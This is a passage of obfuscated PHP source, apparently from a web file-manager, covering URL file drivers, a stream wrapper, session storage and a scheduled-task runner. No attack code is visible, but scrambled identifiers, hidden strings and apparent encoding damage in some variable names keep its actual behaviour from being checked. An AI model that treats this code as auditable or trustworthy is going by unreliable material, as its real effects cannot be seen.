$this->objectMeta($É†Ë¯¨ô); return $íıà…†ü ? $íıà…†ü[$_SERVER[èùÙ¹Ïö][78]] : 0; } public function info($Åƒáû’) { if ($this->isFolder($Åƒáû’)) { return $this->folderInfo($Åƒáû’); } else { if ($this->isFile($Åƒáû’)) { return $this->fileInfo($Åƒáû’); } } return !1; } public function exist($€–ğŠõ) { return $this->isFile($€–ğŠõ) || $this->isFolder($€–ğŠõ); } public function isFile($Æ•àÈã) { return !$this->isFolder($Æ•àÈã) && $this->objectMeta($Æ•àÈã); } public function isFolder($¸àËêÌŒ) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][168], $¸àËêÌŒ); } protected function objectMeta($ş…“õªÁ) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][170], $ş…“õªÁ); } protected function _objectMeta($†¼¹Š¡ú) { $ô¯™¤ãÂ =& $_SERVER[èùÙ¹Ïö]; if ($†¼¹Š¡ú == $ô¯™¤ãÂ[12] || $†¼¹Š¡ú == $ô¯™¤ãÂ[8]) { return array(); } $îüæÁ®Ì = $this->ussRequest($†¼¹Š¡ú, $ô¯™¤ãÂ[1530]); if (!$îüæÁ®Ì[$ô¯™¤ãÂ[1260]]) { return null; } $‹‡„×ô = isset($îüæÁ®Ì[$ô¯™¤ãÂ[1250]]) ? $îüæÁ®Ì[$ô¯™¤ãÂ[1250]] : array(); if (!isset($‹‡„×ô[$ô¯™¤ãÂ[1531]])) { return null; } $Ä×óûóŠ = array($ô¯™¤ãÂ[33] => isset($‹‡„×ô[$ô¯™¤ãÂ[1531]]) ? $‹‡„×ô[$ô¯™¤ãÂ[1531]] : null, $ô¯™¤ãÂ[78] => isset($‹‡„×ô[$ô¯™¤ãÂ[1532]]) ? $‹‡„×ô[$ô¯™¤ãÂ[1532]] : null, $ô¯™¤ãÂ[230] => isset($‹‡„×ô[$ô¯™¤ãÂ[1533]]) ? $‹‡„×ô[$ô¯™¤ãÂ[1533]] : null, $ô¯™¤ãÂ[1500] => isset($‹‡„×ô[$ô¯™¤ãÂ[1534]]) ? $‹‡„×ô[$ô¯™¤ãÂ[1534]] : null); $Ä×óûóŠ[$ô¯™¤ãÂ[1501]] = isset($‹‡„×ô[$ô¯™¤ãÂ[1535]]) ? strtotime($‹‡„×ô[$ô¯™¤ãÂ[1535]]) : $Ä×óûóŠ[$ô¯™¤ãÂ[1500]]; return $Ä×óûóŠ; } protected function _isFolder($œ÷»¥) { $Ø¤–Àù =& $_SERVER[èùÙ¹Ïö]; if ($œ÷»¥ == $Ø¤–Àù[12] || $œ÷»¥ == $Ø¤–Àù[8]) { return !0; } $Çüş“üŞ = $this->_objectMeta($œ÷»¥); return isset($Çüş“üŞ[$Ø¤–Àù[33]]) && $Çüş“üŞ[$Ø¤–Àù[33]] == $Ø¤–Àù[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($‚ÓÑŸÄ = false) { } public function exist($ìïÍ´ó¨) { $ò¥«¡ì£ = $this->info($ìïÍ´ó¨); return $ò¥«¡ì£[$_SERVER[èùÙ¹Ïö][218]]; } public function isFile($ëâòá°¨) { $š¡½÷ïİ = $this->info($ëâòá°¨); return $š¡½÷ïİ[$_SERVER[èùÙ¹Ïö][218]]; } public function isFolder($ïş¡í§) { return !1; } public function size($–¯Èß×) { $Ç“ú°— = $this->info($–¯Èß×); return $Ç“ú°—[$_SERVER[èùÙ¹Ïö][78]]; } public function info($Íš°¾¿Ü) { return $this->infoParse($Íš°¾¿Ü); } public function infoAuth($ìÆÊ‚è) { return $this->infoParse($ìÆÊ‚è); } public function infoWithChildren($±´á–Îì) { return $this->infoParse($±´á–Îì); } public function infoFull($ÔüÙ»§³) { return $this->infoParse($ÔüÙ»§³); } private function infoParse($­¸Œ£Ïù) { $¤õ«·°™ =& $_SERVER[èùÙ¹Ïö]; $âÅ›Ö³™ = $this->header($­¸Œ£Ïù); if (!$âÅ›Ö³™ || !$âÅ›Ö³™[$¤õ«·°™[790]]) { return !1; } $Ö³ı“’İ = _get($âÅ›Ö³™, $¤õ«·°™[383], 0); $öŒĞ±Ë› = array($¤õ«·°™[32] => $âÅ›Ö³™[$¤õ«·°™[32]], $¤õ«·°™[86] => $­¸Œ£Ïù, $¤õ«·°™[33] => $¤õ«·°™[216], $¤õ«·°™[78] => intval($Ö³ı“’İ), $¤õ«·°™[177] => get_path_ext($âÅ›Ö³™[$¤õ«·°™[32]]), $¤õ«·°™[1412] => $Ö³ı“’İ > 0 && $âÅ›Ö³™[$¤õ«·°™[1536]], $¤õ«·°™[1413] => !1); return $öŒĞ±Ë›; } private function header($îÅÂ³–¡) { $Áçİûäá =& $_SERVER[èùÙ¹Ïö]; if (isset(self::$_cacheHeader[$îÅÂ³–¡])) { return self::$_cacheHeader[$îÅÂ³–¡]; } $ĞìùâÊª = isset($GLOBALS[$Áçİûäá[1537]]) ? $GLOBALS[$Áçİûäá[1537]] : !1; $GLOBALS[$Áçİûäá[1537]] = !0; self::$_cacheHeader[$îÅÂ³–¡] = url_header($îÅÂ³–¡); $GLOBALS[$Áçİûäá[1537]] = $ĞìùâÊª; return self::$_cacheHeader[$îÅÂ³–¡]; } public function hashSimple($±ÕÛÒŸ, $Ç‰“„èÇ = false) { $ÚËÊ¹•  =& $_SERVER[èùÙ¹Ïö]; $ÆÜµìµ… = $this->info($±ÕÛÒŸ); if (!$ÆÜµìµ… || !$ÆÜµìµ…[$ÚËÊ¹• [218]]) { return !1; } $ï¯×û–À = $ÆÜµìµ…[$ÚËÊ¹• [78]]; $®ùÁÆÌÚ = 200; $·³ë±çÜ = 50; if ($ï¯×û–À <= $®ùÁÆÌÚ * $·³ë±çÜ) { return md5($this->fileSubstr($±ÕÛÒŸ, 0, $ï¯×û–À)) . $ï¯×û–À; } $ôâ²ÉºÅ = intval($ï¯×û–À / $·³ë±çÜ); $Ú¢È¬¥ = $ÚËÊ¹• [12]; $µ‘Äè¯ = timeFloat(); $‰ÖêÒü = 15; for ($šç®©—’ = 0; $šç®©—’ < $·³ë±çÜ; $šç®©—’++) { if (timeFloat() - $µ‘Äè¯ > $‰ÖêÒü) { return !1; } $¿ó—óäÏ = $this->fileSubstr($±ÕÛÒŸ, $ôâ²ÉºÅ * $šç®©—’, $®ùÁÆÌÚ); if (!$¿ó—óäÏ) { return !1; } $Ú¢È¬¥ .= $¿ó—óäÏ; } $Ú¢È¬¥ .= $this->fileSubstr($±ÕÛÒŸ, $ï¯×û–À - $®ùÁÆÌÚ, $®ùÁÆÌÚ); return md5($Ú¢È¬¥) . $ï¯×û–À; } public function getContent($×¾Ã¸·¾) { return $this->fileSubstr($×¾Ã¸·¾); } public function fileSubstr($ŒÒÛã—Ù, $Ü–ÕıÖ¤ = 0, $¶Õ¡¡•ù = -1) { $¶Š¦×° =& $_SERVER[èùÙ¹Ïö]; $²–õ˜ó• = $this->info($ŒÒÛã—Ù); if (!$²–õ˜ó• || !$²–õ˜ó•[$¶Š¦×°[218]] && $²–õ˜ó•[$¶Š¦×°[78]] > 1024 * 1024 * 10) { return !1; } if ($¶Õ¡¡•ù === -1) { $¶Õ¡¡•ù = $²–õ˜ó•[$¶Š¦×°[78]]; } if ($¶Õ¡¡•ù == 0) { return $¶Š¦×°[12]; } $æÛñÕ¡‡ = array($¶Š¦×°[1538] . $Ü–ÕıÖ¤ . $¶Š¦×°[822] . ($Ü–ÕıÖ¤ + $¶Õ¡¡•ù - 1)); $äÚÌ†î = url_request($ŒÒÛã—Ù, $¶Š¦×°[247], !1, $æÛñÕ¡‡, !1, !1, 30); return $äÚÌ†î[$¶Š¦×°[1250]] ? $äÚÌ†î[$¶Š¦×°[1250]] : $¶Š¦×°[12]; } public function download($Ö¼‘ãõ, $¶‡ªÚÃ¡) { Downloader::start($Ö¼‘ãõ, $¶‡ªÚÃ¡); return $¶‡ªÚÃ¡; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÃË¼µùŒ, $½ªÊ“®Œ = '') { $this->info = $this->info($ÃË¼µùŒ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[èùÙ¹Ïö][86]]; $this->pathOpen = $ÃË¼µùŒ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÃË¼µùŒ])) { self::$_chunkBuffer[$ÃË¼µùŒ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Î¦ÇÇ¶„) { $Äò¯Ğİä = $this->fileSubstr($this->pose, $Î¦ÇÇ¶„); $this->pose += strlen($Äò¯Ğİä); return $Äò¯Ğİä; } public function stream_tell() { return $this->pose; } public function stream_seek($ŸÔŒáì, $ª·Õô Î) { $œÈˆÂ =& $_SERVER[èùÙ¹Ïö]; if ($ª·Õô Î == SEEK_SET) { $this->pose = $ŸÔŒáì; } else { if ($ª·Õô Î == SEEK_CUR) { $this->pose += $ŸÔŒáì; } else { if ($ª·Õô Î == SEEK_END) { $this->pose = $this->info[$œÈˆÂ[78]] + intval($ŸÔŒáì); } } } if ($ŸÔŒáì < 0) { $this->pose = $this->info[$œÈˆÂ[78]] + $ŸÔŒáì; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[èùÙ¹Ïö][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Â­³¦îœ, $´åÛú®µ) { $ãÆÜ—¬‹ =& $_SERVER[èùÙ¹Ïö]; $„“ÛÀÖñ = $this->info($Â­³¦îœ); return array($ãÆÜ—¬‹[1539] => 0, $ãÆÜ—¬‹[1540] => 0, $ãÆÜ—¬‹[16] => 32768 + 511, $ãÆÜ—¬‹[1541] => 0, $ãÆÜ—¬‹[1542] => 0, $ãÆÜ—¬‹[1543] => 0, $ãÆÜ—¬‹[1544] => 0, $ãÆÜ—¬‹[78] => $„“ÛÀÖñ[$ãÆÜ—¬‹[78]], $ãÆÜ—¬‹[1545] => $„“ÛÀÖñ[$ãÆÜ—¬‹[1411]], $ãÆÜ—¬‹[1501] => $„“ÛÀÖñ[$ãÆÜ—¬‹[87]], $ãÆÜ—¬‹[1500] => $„“ÛÀÖñ[$ãÆÜ—¬‹[217]], $ãÆÜ—¬‹[1546] => 0, $ãÆÜ—¬‹[1547] => 0); } static $fileInfo = array(); public function info($œ‚—ƒá«) { $‘Ã›Ö¿† = $_SERVER[èùÙ¹Ïö][1548]; if (isset(self::$fileInfo[$œ‚—ƒá«])) { return self::$fileInfo[$œ‚—ƒá«]; } if (substr($œ‚—ƒá«, 0, strlen($‘Ã›Ö¿†)) != $‘Ã›Ö¿†) { return !1; } self::$fileInfo[$œ‚—ƒá«] = IO::info(substr($œ‚—ƒá«, strlen($‘Ã›Ö¿†))); return self::$fileInfo[$œ‚—ƒá«]; } public static function read($¯»‹¬¬€, $´ø¬¤÷ª, $–èÉ¶¼Ã) { if (!isset(self::$_fopenCache[$¯»‹¬¬€])) { $æä¿İşš = new StreamWrapperIO(); $æä¿İşš->stream_open($¯»‹¬¬€); self::$_fopenCache[$¯»‹¬¬€] = $æä¿İşš; } $æä¿İşš = self::$_fopenCache[$¯»‹¬¬€]; return $æä¿İşš->fileSubstr($´ø¬¤÷ª, $–èÉ¶¼Ã); } public static function _read($‹²œêú°, $ÍÎÉÑ’, $òşŞèª«) { $³¬»¦Ûû =& $_SERVER[èùÙ¹Ïö]; $¤ø‹Ù“» = fopen($‹²œêú°, $³¬»¦Ûû[1415]); if (!$¤ø‹Ù“») { return $³¬»¦Ûû[12]; } $ä§àËø© = 8192; fseek($¤ø‹Ù“», $ÍÎÉÑ’, SEEK_SET); $ÍÙÃÍ»Ì = $³¬»¦Ûû[12]; $ş˜¼ÇµÂ = 0; while ($ş˜¼ÇµÂ < $òşŞèª«) { $ëæû¢…º = min($ä§àËø©, $òşŞèª« - $ş˜¼ÇµÂ); $ÍÙÃÍ»Ì .= fread($¤ø‹Ù“», $ëæû¢…º); $ş˜¼ÇµÂ += $ëæû¢…º; } fclose($¤ø‹Ù“»); return $ÍÙÃÍ»Ì; } public function fileSubstr($¯”´éª±, $ÍŠ‹ÑØ¯) { $œí§´”ğ =& $_SERVER[èùÙ¹Ïö]; $™äì¨Ñ = $this->info[$œí§´”ğ[78]]; $ä§ËÌ“Ó = $¯”´éª±; $Ã•÷ã§ğ = $ÍŠ‹ÑØ¯; if ($¯”´éª± < 0) { $¯”´éª± = $™äì¨Ñ + $¯”´éª±; } if ($ÍŠ‹ÑØ¯ === !1) { $ÍŠ‹ÑØ¯ = $™äì¨Ñ - $¯”´éª±; } if ($¯”´éª± + $ÍŠ‹ÑØ¯ > $™äì¨Ñ) { $ÍŠ‹ÑØ¯ = $™äì¨Ñ - $¯”´éª±; } if ($ÍŠ‹ÑØ¯ <= 0) { return $œí§´”ğ[12]; } if ($¯”´éª± < 0 || $¯”´éª± >= $™äì¨Ñ || $ÍŠ‹ÑØ¯ <= 0 || $ÍŠ‹ÑØ¯ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\154\145\122\x65\141\x64\x20\x65\162\x72\157\162\41\40\x73\x74\x61\162\x74\75{$¯”´éª±}\x3b\x6c\x65\x6e\147\x74\x68\x3d{$ÍŠ‹ÑØ¯}\73\40\x73\x69\172\x65\x3d{$™äì¨Ñ}\73"); } $¥•Àêƒ“ = 64 * 1024; $¢ŞÎ¾–Ë =& self::$_chunkBuffer[$this->path]; if (!$¢ŞÎ¾–Ë) { $¢ŞÎ¾–Ë = array(); } $±œçé¿ = 0; $ëĞİÔ¹ = 0; $Ö³ïçËÂ = $œí§´”ğ[12]; foreach ($¢ŞÎ¾–Ë as $±œçé¿ => $Ö³ïçËÂ) { $±œçé¿ = intval($±œçé¿); $ëĞİÔ¹ = $±œçé¿ + strlen($Ö³ïçËÂ); if ($¯”´éª± >= $ëĞİÔ¹) { continue; } if ($¯”´éª± >= $±œçé¿ && $¯”´éª± + $ÍŠ‹ÑØ¯ <= $ëĞİÔ¹) { return substr($Ö³ïçËÂ, $¯”´éª± - $±œçé¿, $ÍŠ‹ÑØ¯); } break; } if (count($¢ŞÎ¾–Ë) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($œí§´”ğ[1549], $œí§´”ğ[1550] . count($¢ŞÎ¾–Ë) . "\73\163\x74\141\162\x74\75{$¯”´éª±}\x2c\154\145\156\x67\x74\x68\75{$ÍŠ‹ÑØ¯}\x3b\x70\157\x73\145\72{$±œçé¿}\x7e{$ëĞİÔ¹}"); throw new Exception($œí§´”ğ[1551]); } $íƒâí§´ = intval($¯”´éª± / $¥•Àêƒ“) * $¥•Àêƒ“; $¢…á¼Ã = ceil(($¯”´éª± + $ÍŠ‹ÑØ¯) / $¥•Àêƒ“) * $¥•Àêƒ“ - $íƒâí§´; $ªç•Ì“Ó = IO::fileSubstr($this->path, $íƒâí§´, $¢…á¼Ã); $¢ŞÎ¾–Ë[$íƒâí§´ . $œí§´”ğ[12]] = $ªç•Ì“Ó; ksort($¢ŞÎ¾–Ë); $ è’Ö’æ = substr($ªç•Ì“Ó, $¯”´éª± - $íƒâí§´, $ÍŠ‹ÑØ¯); return $ è’Ö’æ; } private function log($áçİ’Õ©, $Ëƒ±ª©¦) { $ü ¯¿ø« =& $_SERVER[èùÙ¹Ïö]; $ê¢ŞÉƒ¦ = timeFloat() - $this->timeStart; write_log(sprintf($ü ¯¿ø«[1552], $áçİ’Õ©, $this->info[$ü ¯¿ø«[32]], $ê¢ŞÉƒ¦, $Ëƒ±ª©¦), $ü ¯¿ø«[1230]); } } goto aœ‚›ë‡Åô; CÜÒä°ˆ©Â: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Òƒ›İ =& $_SERVER[èùÙ¹Ïö]; static $™•Äò‡¢ = false; if ($™•Äò‡¢) { return $™•Äò‡¢; } $³°¦Ÿ§” = $GLOBALS[$Òƒ›İ[6]][$Òƒ›İ[395]]; self::$sessionTime = $³°¦Ÿ§”[$Òƒ›İ[1648]]; $ßö­¢‹Í = isset($GLOBALS[$Òƒ›İ[1649]]) ? $GLOBALS[$Òƒ›İ[1649]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ßö­¢‹Í)) { self::$sessionSign = Cookie::get($ßö­¢‹Í); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ßö­¢‹Í, self::$sessionSign, self::$sessionTime); $öèÄÅÅ‘ = $³°¦Ÿ§”[$Òƒ›İ[1650]]; $“ùßë¼ = $³°¦Ÿ§”[$öèÄÅÅ‘]; $ßæ°ú¸‘ = $³°¦Ÿ§”[$Òƒ›İ[868]]; switch ($öèÄÅÅ‘) { case $Òƒ›İ[21]: self::$handle = Model($Òƒ›İ[869]); break; case $Òƒ›İ[870]: self::$handle = new CacheRedis($“ùßë¼, $ßæ°ú¸‘); break; case $Òƒ›İ[871]: self::$handle = new CacheMemcached($“ùßë¼, $ßæ°ú¸‘); break; case $Òƒ›İ[216]: $“ùßë¼[$Òƒ›İ[86]] = $“ùßë¼[$Òƒ›İ[86]] . $Òƒ›İ[1651]; self::$handle = new CacheFile($“ùßë¼, $ßæ°ú¸‘); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $™•Äò‡¢ = new self(); return $™•Äò‡¢; } public static function getBySign($¤ÙÏ¼ø) { $µ…Ø½š¡ = self::$handle->get($¤ÙÏ¼ø); $µ…Ø½š¡ = unserialize($µ…Ø½š¡); return is_array($µ…Ø½š¡) ? $µ…Ø½š¡ : array(); } public static function setBySign($Á­¹œÙã, $Ä¦¬œ) { CacheLock::lock($Á­¹œÙã); self::$handle->set($Á­¹œÙã, serialize($Ä¦¬œ), self::$sessionTime); CacheLock::unlock($Á­¹œÙã); } public static function sign($¥²ƒ  = false) { if ($¥²ƒ ) { self::$sessionSign = $¥²ƒ ; } self::init(); return self::$sessionSign; } public static function set($¹ÚÍ— Ã, $œÅßàæ¶ = false) { self::init(); if (is_array($¹ÚÍ— Ã)) { foreach ($¹ÚÍ— Ã as $¹»â²¸ => $àñŸÁòó) { array_set_value(self::$data, $¹»â²¸, $àñŸÁòó); } } else { array_set_value(self::$data, $¹ÚÍ— Ã, $œÅßàæ¶); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÈÂ¬˜Î× = false) { self::init(); if (!$ÈÂ¬˜Î×) { return self::$data; } return array_get_value(self::$data, $ÈÂ¬˜Î×); } public static function remove($áÈ›³º×) { self::init(); unset(self::$data[$áÈ›³º×]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[èùÙ¹Ïö][874])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $–èº­Ó… =& $_SERVER[èùÙ¹Ïö]; if (self::valueGet($–èº­Ó…[790]) != $–èº­Ó…[90]) { return; } if (self::valueGet($–èº­Ó…[1652]) == $–èº­Ó…[90]) { $ı×Ø˜Øˆ = self::valueGet($–èº­Ó…[1653]); if (time() - $ı×Ø˜Øˆ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($–èº­Ó…[1652], $–èº­Ó…[90]); self::log($–èº­Ó…[1654] . ACTION . $–èº­Ó…[1655]); Hook::bind($–èº­Ó…[1656], $–èº­Ó…[1657]); $¤ùÖšÑá = 0; while (!0) { self::cacheClear(); if (self::valueGet($–èº­Ó…[790]) != $–èº­Ó…[90]) { self::valueSet($–èº­Ó…[1652], $–èº­Ó…[214]); self::log($–èº­Ó…[1658]); die; } $×ŠÑó»· = time(); if ($×ŠÑó»· - $¤ùÖšÑá >= 60) { self::valueSet(array($–èº­Ó…[1652] => $–èº­Ó…[90], $–èº­Ó…[1653] => $×ŠÑó»·), !1); $¤ùÖšÑá = $×ŠÑó»·; } if (!file_exists(USER_SYSTEM . $–èº­Ó…[1659])) { self::valueSet(array($–èº­Ó…[1652] => $–èº­Ó…[214], $–èº­Ó…[790] => $–èº­Ó…[214]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ë¬¿Ëâº =& $_SERVER[èùÙ¹Ïö]; http_close(); $GLOBALS[$ë¬¿Ëâº[1660]] = 1; $_SERVER[$ë¬¿Ëâº[1661]] = $ë¬¿Ëâº[1662]; $_COOKIE = array(); $GLOBALS[$ë¬¿Ëâº[539]] = 1; $GLOBALS[$ë¬¿Ëâº[1663]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ºóõÏ¢õ =& $_SERVER[èùÙ¹Ïö]; http_close(); self::valueSet($ºóõÏ¢õ[790], $ºóõÏ¢õ[214]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ºóõÏ¢õ[1652] => $ºóõÏ¢õ[214], $ºóõÏ¢õ[790] => $ºóõÏ¢õ[90]), !1); } public static function taskSwitch() { $Íî¦ç¿¿ =& $_SERVER[èùÙ¹Ïö]; $ä¹†ÎŸÒ = self::valueGet($Íî¦ç¿¿[790]) == $Íî¦ç¿¿[90] ? $Íî¦ç¿¿[214] : $Íî¦ç¿¿[90]; self::valueSet($Íî¦ç¿¿[790], $ä¹†ÎŸÒ); } public static function shutdownEvent() { $¢é·‰©Ø =& $_SERVER[èùÙ¹Ïö]; self::valueSet($¢é·‰©Ø[1652], $¢é·‰©Ø[214]); self::log($¢é·‰©Ø[1664]); } public static function config($ûôëÌÔ©, $¢ä–€èì) { self::valueSet($_SERVER[èùÙ¹Ïö][790], $ûôëÌÔ©); } private static function taskRunAll() { $Ñ«Ï²Áì =& $_SERVER[èùÙ¹Ïö]; $ŠšÒØ¶ü = timeFloat(); $ÃÖî•¶ = Model($Ñ«Ï²Áì[1665])->listData(); $˜ä²‚÷ = count($ÃÖî•¶); for ($¾ä«¯úÈ = 0; $¾ä«¯úÈ < $˜ä²‚÷; $¾ä«¯úÈ++) { $‰—êÔ× = $ÃÖî•¶[$¾ä«¯úÈ]; if (!$‰—êÔ×[$Ñ«Ï²Áì[445]] || $‰—êÔ×[$Ñ«Ï²Áì[1666]] != $Ñ«Ï²Áì[90]) { continue; } if (!self::taskTimeCheck($‰—êÔ×)) { continue; } self::taskRun($‰—êÔ×); } Hook::trigger($Ñ«Ï²Áì[1667]); self::taskQueueRun($ŠšÒØ¶ü); } private static function taskQueueRun($÷ËÊÒ£) { $Çı“æœá = 10; while (!0) { $ÔµÛ¿ƒ = TaskQueue::run(); if ($ÔµÛ¿ƒ === !1) { break; } if (timeFloat() - $÷ËÊÒ£ >= $Çı“æœá) { break; } } } private static function taskTimeCheck($Ûï«õÚ¾) { $ÍĞå¤òÃ =& $_SERVER[èùÙ¹Ïö]; $µ±¥úôí = json_decode($Ûï«õÚ¾[$ÍĞå¤òÃ[196]], !0); $šº¦Î•  = intval($Ûï«õÚ¾[$ÍĞå¤òÃ[1653]]); $Şˆö‹ö¥ = strtotime($ÍĞå¤òÃ[1668] . $µ±¥úôí[$ÍĞå¤òÃ[1669]] . $ÍĞå¤òÃ[1670]) - strtotime($ÍĞå¤òÃ[1671]); $»‚–ø×— = time() - strtotime(date($ÍĞå¤òÃ[1672]) . $ÍĞå¤òÃ[1673]); $˜áÇŒ» = $»‚–ø×— >= $Şˆö‹ö¥ && $»‚–ø×— <= $Şˆö‹ö¥ + 3600; switch ($µ±¥úôí[$ÍĞå¤òÃ[33]]) { case $ÍĞå¤òÃ[1674]: if (time() - $šº¦Î•  < 3600 * 24 * 30) { return !1; } if ($µ±¥úôí[$ÍĞå¤òÃ[1674]] == date($ÍĞå¤òÃ[1675]) && $˜áÇŒ») { return !0; } break; case $ÍĞå¤òÃ[1676]: if (time() - $šº¦Î•  < 3600 * 24 * 7) { return !1; } $™şÈÙø = date($ÍĞå¤òÃ[1677]) == 0 ? 7 : date($ÍĞå¤òÃ[1677]); if ($µ±¥úôí[$ÍĞå¤òÃ[1676]] == $™şÈÙø && $˜áÇŒ») { return !0; } break; case $ÍĞå¤òÃ[1669]: if (time() - $šº¦Î•  < 3600 * 24) { return !1; } if ($˜áÇŒ») { return !0; } break; case $ÍĞå¤òÃ[1678]: if (time() - $šº¦Î•  >= floatval($µ±¥úôí[$ÍĞå¤òÃ[1678]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ä·âô”‚ =& $_SERVER[èùÙ¹Ïö]; static $®ÆïÏïÏ = 0; $´ìèùï¤ = 300; if (!$®ÆïÏïÏ) { $®ÆïÏïÏ = time(); } if (time() - $®ÆïÏïÏ < $´ìèùï¤) { return; } $®ÆïÏïÏ = time(); $´Ğ—ÍÛş = Model($ä·âô”‚[549])->db($ä·âô”‚[12]); if ($´Ğ—ÍÛş) { $´Ğ—ÍÛş->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ä·âô”‚[1679], $ä·âô”‚[1680]); die; } } public static function taskRun($¿´Ïõõ£) { $‚íâç—ñ =& $_SERVER[èùÙ¹Ïö]; self::log($‚íâç—ñ[1681] . $¿´Ïõõ£[$‚íâç—ñ[445]] . $‚íâç—ñ[1682] . $¿´Ïõõ£[$‚íâç—ñ[32]] . $‚íâç—ñ[1683] . $¿´Ïõõ£[$‚íâç—ñ[1684]]); Model($‚íâç—ñ[1665])->run($¿´Ïõõ£[$‚íâç—ñ[445]]); $ŒË‚¸÷“ = timeFloat(); $ç ›™ùÍ = $‚íâç—ñ[12]; switch ($¿´Ïõõ£[$‚íâç—ñ[33]]) { case $‚íâç—ñ[353]: $¸¼´¼‘Ì = url_request($¿´Ïõõ£[$‚íâç—ñ[1684]], $‚íâç—ñ[247], !1, !1, !1, !1, 10); if ($¸¼´¼‘Ì[$‚íâç—ñ[790]]) { $ç ›™ùÍ = strlen($¸¼´¼‘Ì[$‚íâç—ñ[1250]]); } break; case $‚íâç—ñ[246]: $ç ›™ùÍ = Hook::apply($¿´Ïõõ£[$‚íâç—ñ[1684]]); default: break; } Model($‚íâç—ñ[1685])->add(array($‚íâç—ñ[1686] => $‚íâç—ñ[12], $‚íâç—ñ[1687] => $‚íâç—ñ[214], $‚íâç—ñ[33] => $‚íâç—ñ[1688] . $¿´Ïõõ£[$‚íâç—ñ[445]], $‚íâç—ñ[1689] => json_encode(array($‚íâç—ñ[32] => $¿´Ïõõ£[$‚íâç—ñ[32]], $‚íâç—ñ[1690] => timeFloat() - $ŒË‚¸÷“, $‚íâç—ñ[339] => $ç ›™ùÍ)))); $“×Šæşœ = $ç ›™ùÍ ? $‚íâç—ñ[1691] . $ç ›™ùÍ : $‚íâç—ñ[12]; self::log($‚íâç—ñ[1692] . $¿´Ïõõ£[$‚íâç—ñ[445]] . $‚íâç—ñ[167] . $“×Šæşœ); return !0; } public static function valueGet($ùæİÒŠ) { $­Å‡‡Ÿè =& $_SERVER[èùÙ¹Ïö]; $ĞàæË¼ = $­Å‡‡Ÿè[1693]; $†ğ—Ş¥ì = Model($­Å‡‡Ÿè[478])->get($ùæİÒŠ, $ĞàæË¼); if (is_null($†ğ—Ş¥ì)) { Model($­Å‡‡Ÿè[478])->set($­Å‡‡Ÿè[790], $­Å‡‡Ÿè[90], $ĞàæË¼); Model($­Å‡‡Ÿè[478])->set($­Å‡‡Ÿè[1652], $­Å‡‡Ÿè[214], $ĞàæË¼); $†ğ—Ş¥ì = Model($­Å‡‡Ÿè[478])->get($ùæİÒŠ, $ĞàæË¼); } return $†ğ—Ş¥ì; } private static function valueSet($ëØ¯Ï¨, $îìğ‡®‰) { $§Ü¾‚… =& $_SERVER[èùÙ¹Ïö]; $âî®Ä¬˜ = $§Ü¾‚…[1694]; CacheLock::lock($âî®Ä¬˜); $âàŒÈ‡à = Model($§Ü¾‚…[478])->set($ëØ¯Ï¨, $îìğ‡®‰, $§Ü¾‚…[1693]); CacheLock::unlock($âî®Ä¬˜); return $âàŒÈ‡à; } protected static function log($æ¹ú¹ü’) { write_log($æ¹ú¹ü’, $_SERVER[èùÙ¹Ïö][1680]); } private static function cacheClear() { $êÙˆ‘–û =& $_SERVER[èùÙ¹Ïö]; Cache::clearMemory(Model($êÙˆ‘–û[478])->cacheKey($êÙˆ‘–û[1693])); Cache::clearMemory(Model($êÙˆ‘–û[478])->cacheKey($êÙˆ‘–û[1695])); Model($êÙˆ‘–û[1665])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\156\x69\156\147"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¹¤¥Û¯†, $ö×÷©ó¸ = '', $Ñ¸õ÷åÇ = 0, $Šæ‡—Æâ = '') { $Òâˆû¬ı =& $_SERVER[èùÙ¹Ïö]; if (self::get($¹¤¥Û¯†)) { return; } $this->task = array($Òâˆû¬ı[445] => $¹¤¥Û¯†, $Òâˆû¬ı[1696] => USER_ID, $Òâˆû¬ı[1592] => $Šæ‡—Æâ, $Òâˆû¬ı[496] => $Òâˆû¬ı[12], $Òâˆû¬ı[33] => $ö×÷©ó¸, $Òâˆû¬ı[1110] => $Òâˆû¬ı[12], $Òâˆû¬ı[826] => $Ñ¸õ÷åÇ, $Òâˆû¬ı[1697] => 0, $Òâˆû¬ı[1698] => 0, $Òâˆû¬ı[1699] => 0, $Òâˆû¬ı[1700] => timeFloat(), 